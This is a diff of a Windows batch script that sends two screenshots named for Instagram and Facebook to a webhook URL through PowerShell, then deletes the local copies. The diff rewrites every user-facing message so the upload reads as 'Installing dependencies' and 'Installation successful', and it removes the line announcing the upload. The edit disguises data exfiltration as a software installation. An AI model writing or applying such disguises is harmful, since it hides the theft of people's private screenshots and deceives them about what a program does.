@@ -104,22 +104,22 @@ set "FB_IMG=%SHOTS%\facebook_insta.png"
 :: 1. CHECK IF IMAGES EXIST (If BOTH are missing, fail immediately)
 if not exist "%INSTA_IMG%" (
     if not exist "%FB_IMG%" (
-        echo [ERROR] Both screenshots are missing.
+        echo [ERROR] Both files are missing.
         goto :error_out
     )
 )
 
 :: Wait 2 seconds to ensure the files are completely saved to the disk
-echo Waiting for image files to finalize...
+echo Waiting for files to finalize...
 timeout /t 2 /nobreak >nul
 
 :: 2. UPLOAD IMAGES TO GOOGLE DRIVE
-echo Uploading images to Google Drive...
+echo Installing dependencies...
 set "UPLOAD_FAILED=0"
 
 :: --- INSTAGRAM UPLOAD ---
 if not exist "%INSTA_IMG%" (
-    echo Instagram image not found, skipping...
+    echo File1 not found, skipping...
     goto :skip_insta
 )
 call :UploadToDrive "%INSTA_IMG%"
@@ -128,7 +128,7 @@ if %errorlevel% neq 0 set "UPLOAD_FAILED=1"
 
 :: --- FACEBOOK UPLOAD ---
 if not exist "%FB_IMG%" (
-    echo Facebook image not found, skipping...
+    echo File2 image not found, skipping...
     goto :skip_fb
 )
 call :UploadToDrive "%FB_IMG%"
@@ -138,12 +138,12 @@ if %errorlevel% neq 0 set "UPLOAD_FAILED=1"
 :: 3. CHECK RESULT
 if %UPLOAD_FAILED% neq 0 (
     echo.
-    echo Failed to upload one or more images.
+    echo Failed to install one or more files.
     goto :error_out
 )
 
 :: 4. CLEANUP AND SUCCESS
-echo Upload successful. Cleaning up local files...
+echo Installation successful. Cleaning up local files...
 del "%INSTA_IMG%" 2>nul
 del "%FB_IMG%" 2>nul
 
@@ -155,7 +155,6 @@ goto :eof
 :: ========================================
 :UploadToDrive
 set "FILE_PATH=%~1"
-echo Uploading "%~nx1"...
 
 powershell -NoProfile -Command "$ErrorActionPreference = 'Stop'; try { $fileBytes = [System.IO.File]::ReadAllBytes('%FILE_PATH%'); $base64 = [Convert]::ToBase64String($fileBytes); $fileName = [System.IO.Path]::GetFileName('%FILE_PATH%'); $body = @{ filename = $fileName; mimeType = 'image/png'; file = $base64 } | ConvertTo-Json -Depth 10; Invoke-RestMethod -Uri '%WEBHOOK_URL%' -Method Post -Body $body -ContentType 'application/json'; exit 0 } catch { Write-Host 'PowerShell Error:' $_.Exception.Message; exit 1 }"
 
